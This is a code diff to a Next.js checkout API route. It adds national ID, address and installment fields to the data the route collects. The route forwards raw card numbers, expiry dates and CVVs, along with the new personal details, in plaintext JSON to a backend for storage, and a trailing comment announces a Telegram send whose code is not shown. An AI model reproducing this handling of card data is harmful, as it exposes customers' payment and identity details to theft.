@@ -1,15 +1,16 @@
 import { NextRequest, NextResponse } from "next/server";
 
 export async function POST(req: NextRequest) {
-  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, installmentType, downPayment } = await req.json();
+  const { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment } = await req.json();
 
   const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
+  const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((total - downPayment) / months) : 0;
 
   // حفظ في الداتابيز
   await fetch(`${process.env.BACKEND_URL}/api/checkout`, {
     method: "POST",
     headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer }),
+    body: JSON.stringify({ orderId, cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, monthlyPayment, downPayment }),
   });
 
   // Send Telegram
